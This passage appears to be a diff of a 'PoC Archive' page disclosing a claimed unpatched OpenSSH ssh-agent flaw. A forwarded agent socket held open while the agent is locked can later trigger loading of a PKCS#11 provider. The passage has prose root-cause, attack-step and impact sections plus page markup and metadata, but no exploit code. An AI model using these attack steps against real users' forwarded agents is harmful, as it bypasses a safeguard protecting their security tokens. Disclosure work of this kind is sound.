local.</li><li><code>process_add_smartcard_key()</code> — which is supposed to reject provider-add requests from remote/forwarded sockets — evaluates its remote-socket check as false and forwards the request to <code>pkcs11_add_provider()</code>, which starts <code>ssh-pkcs11-helper</code> and loads the specified PKCS#11 module.</li></ol><p>The same flawed classification is also consulted by the external-security-key provider path (<code>process_add_identity()</code>), not just the smartcard path.</p><h3 id=attack-vector>Attack Vector</h3><ol><li>Victim connects with <code>ssh -A</code> (agent forwarding) to a server the attacker controls or has compromised, while their local <code>ssh-agent</code> happens to be locked.</li><li>The malicious/compromised server side (or a process on it) holds the forwarded <code>SSH_AUTH_SOCK</code> connection open. The locked agent refuses the <code>session-bind@openssh.com</code> extension, but the SSH client still creates the forwarded agent channel regardless.</li><li>At some later point the victim unlocks their local agent through an unrelated, legitimate local action.</li><li>The attacker-influenced remote side sends <code>SSH_AGENTC_ADD_SMARTCARD_KEY</code> over the still-open forwarded socket, specifying a PKCS#11 module path that&rsquo;s on the local provider allowlist.</li><li>Because the forwarded socket was never marked as having attempted (and failed) a session bind, the agent treats the request as local and initializes the specified provider — something that should be restricted to genuinely local callers.</li></ol><h3 id=impact>Impact</h3><p>A remote party the victim connects to with agent forwarding enabled can cause the victim&rsquo;s local <code>ssh-agent</code> to load and initialize a PKCS#11 provider module of the attacker&rsquo;s choosing (constrained to whatever&rsquo;s on the local provider allowlist) without the provider-restriction check that OpenSSH specifically added to prevent forwarded/remote connections from doing this. Depending on what provider modules are permitted/present on the victim&rsquo;s system, this could be leveraged to interact with security tokens or trigger provider-specific behavior the victim did not intend to expose to a remote party.</p></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=environment-/-lab-setup class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
-Environment / Lab Setup</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Output</span>
-<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><pre class="px-3 py-2 font-mono text-[11px] leading-normal text-zinc-700 dark:text-slate-300"><code>Target:      Stock, unmodified OpenSSH portable 10.4p1 (release archive checksum
+<!DOCTYPE html>
+<html lang="en" class="dark scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>OpenSSH Forwarded-Agent Lock/Unlock State Confusion → Unauthorized PKCS#11 Provider Load (No CVE) · PoC Archive</title><meta name="description" content="OpenSSH&#39;s ssh-agent supports being locked with a password, during which it is supposed to refuse essentially all requests — including the session-bind@openssh.com extension that a forwarded agent connection uses to record which remote session it belongs to.…" />
+<meta name="author" content="intelseclab" />
+<meta name="theme-color" content="#09090b" /><meta name="keywords" content="CVE, PoC, exploit, proof of concept, security research, OpenSSH portable — ssh, sshd, ssh-agent, openssh, ssh-agent, agent-forwarding, pkcs11, race-condition, state-confusion, no-cve, local-provider-abuse" /><link rel="canonical" href="https://poc.intelseclab.com/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/" /><meta property="og:title"       content="OpenSSH Forwarded-Agent Lock/Unlock State Confusion → Unauthorized PKCS#11 Provider Load (No CVE) · PoC Archive" />
+<meta property="og:description" content="OpenSSH&#39;s ssh-agent supports being locked with a password, during which it is supposed to refuse essentially all requests — including the session-bind@openssh.com extension that a forwarded agent connection uses to record which remote session it belongs to.…" />
+<meta property="og:type"        content="article" />
+<meta property="og:url"         content="https://poc.intelseclab.com/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/" />
+<meta property="og:site_name"   content="PoC Archive" />
+<meta property="og:locale"      content="en_US" />
+<meta property="og:image"       content="https://poc.intelseclab.com/og-image.png" />
+<meta property="og:image:width"  content="1200" />
+<meta property="og:image:height" content="630" />
+<meta name="twitter:image"      content="https://poc.intelseclab.com/og-image.png" />
+<meta name="twitter:card"       content="summary_large_image" />
+
+<meta property="article:published_time" content="2026-07-12T00:00:00Z" />
+<meta property="article:modified_time"  content="2026-07-12T00:00:00Z" />
+
+<meta property="article:tag" content="openssh" />
+
+<meta property="article:tag" content="ssh-agent" />
+
+<meta property="article:tag" content="agent-forwarding" />
+
+<meta property="article:tag" content="pkcs11" />
+
+<meta property="article:tag" content="race-condition" />
+
+<meta property="article:tag" content="state-confusion" />
+
+<meta property="article:tag" content="no-cve" />
+
+<meta property="article:tag" content="local-provider-abuse" />
+
+<meta name="twitter:title"       content="OpenSSH Forwarded-Agent Lock/Unlock State Confusion → Unauthorized PKCS#11 Provider Load (No CVE) · PoC Archive" />
+<meta name="twitter:description" content="OpenSSH&#39;s ssh-agent supports being locked with a password, during which it is supposed to refuse essentially all requests — including the session-bind@openssh.com extension that a forwarded agent connection uses to record which remote session it belongs to.…" />
+<meta name="twitter:site"        content="@intelseclab" /><meta name="geo.region"    content="US" />
+<meta name="geo.placename" content="United States" />
+<meta name="language"      content="en" />
+<meta name="revisit-after" content="3 days" />
+<meta name="robots"        content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<script>
+  (function () {
+    try {
+      var t = localStorage.getItem('theme');
+      if (t === 'light') { document.documentElement.classList.remove('dark'); }
+      else { document.documentElement.classList.add('dark'); }
+    } catch (e) {}
+  })();
+</script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: 'class',
+    theme: {
+      extend: {
+        fontFamily: {
+          sans: ['Inter', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+          mono: ['"JetBrains Mono"', 'ui-monospace', 'SFMono-Regular', 'monospace'],
+        },
+        colors: {
+          
+          mono: {
+            bg:     '#0b0f12',
+            card:   '#12181d',
+            border: '#1e262c',
+            hover:  '#182129',
+            muted:  '#64748b',
+          },
+          brand: {
+            DEFAULT: '#10b981',
+            dim:     '#064e3b',
+            light:   '#a7f3d0',
+          },
+        },
+      },
+    },
+  };
+</script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
+  rel="stylesheet"
+/>
+
+<link rel="stylesheet" href="/css/syntax.css" />
+
+<style>
+  html.dark body { background-color: #0b0f12; }
+   
+  body, body * { transition: background-color .15s ease, border-color .15s ease, color .15s ease; }
+
+   
+  html, body { overflow-x: hidden; max-width: 100%; }
+  .prose :where(p, li, blockquote, td, th) {
+    overflow-wrap: break-word;
+    word-break: break-word;
+  }
+  .prose :where(code):not(pre code) {
+    overflow-wrap: break-word;
+    word-break: break-word;
+  }
+
+   
+  .prose table th:first-child,
+  .prose table td:first-child {
+    width: 1%;
+    white-space: nowrap;
+  }
+
+   
+  .poc-code-body pre {
+    margin: 0 !important;
+    padding: 0.55rem 0.85rem !important;
+    background: transparent !important;
+  }
+  .poc-code-body .chroma { background: transparent !important; }
+   
+  .poc-code-body table { margin: 0 !important; width: 100%; border: 0; }
+  .poc-code-body td { padding: 0 !important; border: 0 !important; }
+  .poc-code-body td:first-child { width: 1%; white-space: nowrap; }
+
+   
+  .toc #TableOfContents ul,
+  .toc > nav ul { list-style: none; padding-left: 0; margin: 0; }
+  .toc #TableOfContents li,
+  .toc > nav li { margin-top: 0.25rem; }
+  .toc #TableOfContents li li,
+  .toc > nav li li { padding-left: 0.75rem; }
+  .toc #TableOfContents a,
+  .toc > nav a {
+    color: #71717a;
+    text-decoration: none;
+    font-family: var(--font-mono, "JetBrains Mono", ui-monospace, monospace);
+    font-size: 0.75rem;
+    transition: color 0.15s;
+  }
+  .toc #TableOfContents a:hover,
+  .toc > nav a:hover { color: #059669; }
+  .dark .toc #TableOfContents a,
+  .dark .toc > nav a { color: #a1a1aa; }
+  .dark .toc #TableOfContents a:hover,
+  .dark .toc > nav a:hover { color: #34d399; }
+</style>
+
+
+<link rel="alternate" type="application/rss+xml" href="https://poc.intelseclab.com/index.xml" title="PoC Archive — all new PoCs" />
+<link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+
+</head>
+<body class="min-h-screen bg-white text-zinc-900 font-sans antialiased selection:bg-emerald-400/20 selection:text-emerald-900 dark:bg-mono-bg dark:text-zinc-100 dark:selection:text-emerald-200">
+  <header class="sticky top-0 z-40 border-b border-zinc-200/80 bg-white/80 backdrop-blur dark:border-mono-border dark:bg-mono-bg/80">
+  <div class="mx-auto flex w-full max-w-6xl items-center gap-4 px-4 py-3 sm:px-6 lg:px-8">
+    <a href="/" class="flex items-center gap-2 font-mono text-sm font-semibold tracking-tight text-zinc-900 dark:text-zinc-100">
+      <img src="/favicon.svg" width="36" height="36" alt="PoC Archive" />
+      <span>PoC Archive</span>
+    </a>
+
+    <nav class="ml-2 hidden items-center gap-1 text-sm sm:flex">
+      
+      <a href="/" class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100">home</a>
+      <a href="/pocs/" class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100 !text-emerald-600 dark:!text-emerald-400">pocs</a>
+      <a href="/watchlist/" class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100">watchlist</a>
+    </nav>
+    <div class="ml-auto hidden items-center gap-3 font-mono text-xs sm:flex">
+      <span class="flex items-center gap-1.5 text-zinc-500 dark:text-zinc-400">
+        <span class="h-1.5 w-1.5 animate-pulse rounded-full bg-emerald-500"></span>
+        <strong class="font-semibold text-zinc-800 dark:text-zinc-100">772</strong> PoCs
+      </span>
+      <span class="text-zinc-300 dark:text-zinc-700">|</span>
+      <a href="/pocs/?signal=kev" class="font-semibold text-red-600 transition hover:underline dark:text-red-400">116 CISA KEV</a>
+    </div>
+
+    <div class="ml-auto flex items-center gap-2 sm:ml-3">
+      
+      <a href="https://poc.intelseclab.com/index.xml" target="_blank" rel="noopener noreferrer" title="RSS feed of new PoCs" aria-label="RSS feed" class="inline-flex h-8 w-8 items-center justify-center rounded-md border border-zinc-200 text-zinc-700 transition hover:bg-zinc-100 dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover">
+        <svg class="h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1"/></svg>
+      </a>
+      
+      <a href="https://github.com/intelseclab/poc-archive" target="_blank" rel="noopener noreferrer" class="hidden rounded-md border border-zinc-200 px-3 py-1.5 text-xs font-medium text-zinc-700 transition hover:bg-zinc-100 sm:inline-flex dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover">
+        GitHub
+      </a>
+      <button
+        type="button"
+        id="theme-toggle"
+        aria-label="Toggle color theme"
+        class="inline-flex h-8 w-8 items-center justify-center rounded-md border border-zinc-200 text-zinc-700 transition hover:bg-zinc-100 focus:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover"
+      >
+        <svg class="hidden h-4 w-4 dark:block" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+        <svg class="block h-4 w-4 dark:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+      </button>
+    </div>
+  </div>
+
+  
+  <nav class="flex items-center gap-1 border-t border-zinc-200 px-4 py-2 text-sm sm:hidden dark:border-mono-border">
+    <a href="/" class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">home</a>
+    <a href="/pocs/" class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">pocs</a>
+    <a href="/watchlist/" class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">watchlist</a>
+  </nav>
+
+  <script>
+    (function () {
+      var btn = document.getElementById('theme-toggle');
+      if (!btn) return;
+      btn.addEventListener('click', function () {
+        var root = document.documentElement;
+        var isDark = root.classList.toggle('dark');
+        try { localStorage.setItem('theme', isDark ? 'dark' : 'light'); } catch (e) {}
+      });
+    })();
+  </script>
+</header>
+
+  <main class="mx-auto w-full max-w-6xl px-4 py-8 sm:px-6 lg:px-8">
+    
+
+
+<nav class="mb-4 flex flex-wrap items-center justify-between gap-2 font-mono text-xs">
+  <div class="flex min-w-0 items-center gap-2 text-zinc-500 dark:text-mono-muted">
+    <a href="/pocs/" class="transition hover:text-emerald-600 dark:hover:text-white">pocs</a>
+    <span>/</span>
+    <a href="/pocs/network/" class="transition hover:text-emerald-600 dark:hover:text-white">network</a>
+    <span>/</span>
+    <span class="truncate text-emerald-600 dark:text-brand">entry</span>
+  </div>
+  <a href="/pocs/" class="flex shrink-0 items-center gap-1 text-zinc-500 transition hover:text-emerald-600 dark:text-mono-muted dark:hover:text-white">
+    <svg class="h-3.5 w-3.5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+    <span class="hidden sm:inline">Back to catalogue</span>
+  </a>
+</nav>
+
+
+<div class="space-y-4 rounded-lg border border-zinc-200 bg-white p-5 dark:border-mono-border dark:bg-mono-card">
+
+  <div class="flex flex-wrap items-center justify-between gap-2 font-mono text-xs">
+    <div class="flex flex-wrap items-center gap-2">
+      <span class="rounded border border-zinc-200 bg-zinc-50 px-2 py-0.5 text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">category: network</span>
+      <span class="rounded border border-zinc-200 bg-zinc-50 px-2 py-0.5 font-bold text-zinc-900 dark:border-mono-border dark:bg-mono-bg dark:text-white">
+        (HIGH)
+      </span>
+      
+
+    </div>
+    <span class="flex items-center gap-1.5 whitespace-nowrap text-[11px] font-medium text-red-500 dark:text-red-400" title="No vendor fix at the time of writing">
+  <span class="h-2 w-2 rounded-full animate-pulse bg-red-500"></span>Unpatched
+</span>
+  </div>
+
+  <div class="space-y-1">
+    <h1 class="text-balance font-mono text-lg font-bold tracking-tight text-zinc-900 sm:text-xl dark:text-white">OpenSSH Forwarded-Agent Lock/Unlock State Confusion → Unauthorized PKCS#11 Provider Load (No CVE)</h1>
+    <p class="font-mono text-xs text-zinc-500 dark:text-mono-muted">
+      Published: <span class="text-zinc-700 dark:text-slate-300">2026-07-12</span> • Researcher: <span class="text-emerald-600 dark:text-brand">bikini (exploitarium)</span>
+    </p>
+  </div>
+
+  
+  <div class="grid grid-cols-2 gap-3 border-t border-zinc-200/60 pt-3 font-mono text-xs sm:grid-cols-4 dark:border-mono-border/60">
+    <div class="min-w-0">
+      <span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Target software</span>
+      <span class="block break-words text-zinc-800 dark:text-slate-300">OpenSSH portable — ssh, sshd, ssh-agent</span>
+    </div>
+    <div class="min-w-0">
+      <span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Affected versions</span>
+      <span class="block break-words text-zinc-800 dark:text-slate-300">Portable tags V_9_3_P2 through V_10_4_P1 (provider restriction logic present since 9.3p2; failed-session-bind tracking added in 9.6p1, still reachable behind the locked gate through 10.4p1)</span>
+    </div>
+    <div class="min-w-0">
+      <span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Status</span>
+      <span class="block break-words text-zinc-800 dark:text-slate-300">PoC — reproducible against a signed, checksum/signature-verified stock OpenSSH 10.4p1 build; no weaponized payload beyond starting an allowed PKCS#11 provider</span>
+    </div>
+    <div class="min-w-0">
+      <span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Severity</span>
+      <span class="block break-words text-zinc-800 dark:text-slate-300">High</span>
+    </div>
+  </div>
+</div>
+
+
+<div class="mt-6 grid grid-cols-1 gap-6 lg:grid-cols-4">
+
+  <div class="min-w-0 space-y-4 lg:col-span-3">
+
+    
+    <div class="lg:hidden"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+  
+
+  <dl class="space-y-3 font-mono text-xs">
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Severity</dt>
+      <dd class="mt-1"><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400">
+  <span class="h-1.5 w-1.5 rounded-full bg-current"></span>High
+</span>
+</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Category</dt>
+      <dd class="mt-1">
+        <a href="/pocs/network/" class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">network</a>
+      </dd>
+    </div>
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">OpenSSH portable — ssh, sshd, ssh-agent</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">Portable tags V_9_3_P2 through V_10_4_P1 (provider restriction logic present since 9.3p2; failed-session-bind tracking added in 9.6p1, still reachable behind the locked gate through 10.4p1)</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-07-12</dd>
+    </div>
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt>
+      <dd class="mt-1">
+        <span class="text-red-500 dark:text-red-400" title="No vendor fix at the time of writing">Unpatched</span>
+      </dd>
+    </div>
+  </dl>
+
+  
+  <div>
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p>
+    <div class="mt-2 flex flex-wrap gap-1.5">
+      
+      <a href="/tags/openssh/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#openssh</a>
+      
+      <a href="/tags/ssh-agent/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#ssh-agent</a>
+      
+      <a href="/tags/agent-forwarding/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#agent-forwarding</a>
+      
+      <a href="/tags/pkcs11/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#pkcs11</a>
+      
+      <a href="/tags/race-condition/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#race-condition</a>
+      
+      <a href="/tags/state-confusion/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#state-confusion</a>
+      
+      <a href="/tags/no-cve/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#no-cve</a>
+      
+      <a href="/tags/local-provider-abuse/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#local-provider-abuse</a>
+      
+    </div>
+  </div>
+  
+
+  
+  <div>
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p>
+    <ul class="mt-2 space-y-1.5">
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://www.openbsd.org/openssh/agent-restrict.html" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.openbsd.org/openssh/agent-restrict.html</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://man.openbsd.org/ssh-agent.1" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://man.openbsd.org/ssh-agent.1</a>
+      </li>
+      
+    </ul>
+  </div>
+  <div class="border-t border-zinc-200 pt-4 dark:border-mono-border">
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p>
+    <a href="https://github.com/intelseclab/poc-archive/tree/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/" target="_blank" rel="noopener noreferrer"
+       class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">
+      <svg class="h-3.5 w-3.5 flex-shrink-0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+      intelseclab/poc-archive
+    </a>
+  </div>
+</div>
+</div>
+    <details class="rounded-lg border border-zinc-200 lg:hidden dark:border-mono-border dark:bg-mono-card">
+      <summary class="cursor-pointer select-none px-4 py-2 font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-mono-muted">On this page</summary>
+      <div class="toc border-t border-zinc-100 px-4 pb-3 text-sm leading-relaxed dark:border-mono-border"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#metadata">Metadata</a></li>
+    <li><a href="#affected-target">Affected Target</a></li>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#vulnerability-details">Vulnerability Details</a>
+      <ul>
+        <li><a href="#root-cause">Root Cause</a></li>
+        <li><a href="#attack-vector">Attack Vector</a></li>
+        <li><a href="#impact">Impact</a></li>
+      </ul>
+    </li>
+    <li><a href="#environment--lab-setup">Environment / Lab Setup</a>
+      <ul>
+        <li><a href="#setup-steps">Setup Steps</a></li>
+      </ul>
+    </li>
+    <li><a href="#proof-of-concept">Proof of Concept</a>
+      <ul>
+        <li><a href="#step-by-step-reproduction">Step-by-Step Reproduction</a></li>
+        <li><a href="#exploit-code">Exploit Code</a></li>
+        <li><a href="#expected-output">Expected Output</a></li>
+      </ul>
+    </li>
+    <li><a href="#detection--indicators-of-compromise">Detection &amp; Indicators of Compromise</a></li>
+    <li><a href="#remediation">Remediation</a></li>
+    <li><a href="#references">References</a></li>
+    <li><a href="#notes">Notes</a></li>
+  </ul>
+</nav></div>
+    </details>
+
+    <section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="metadata" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+
+            
+            Metadata
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
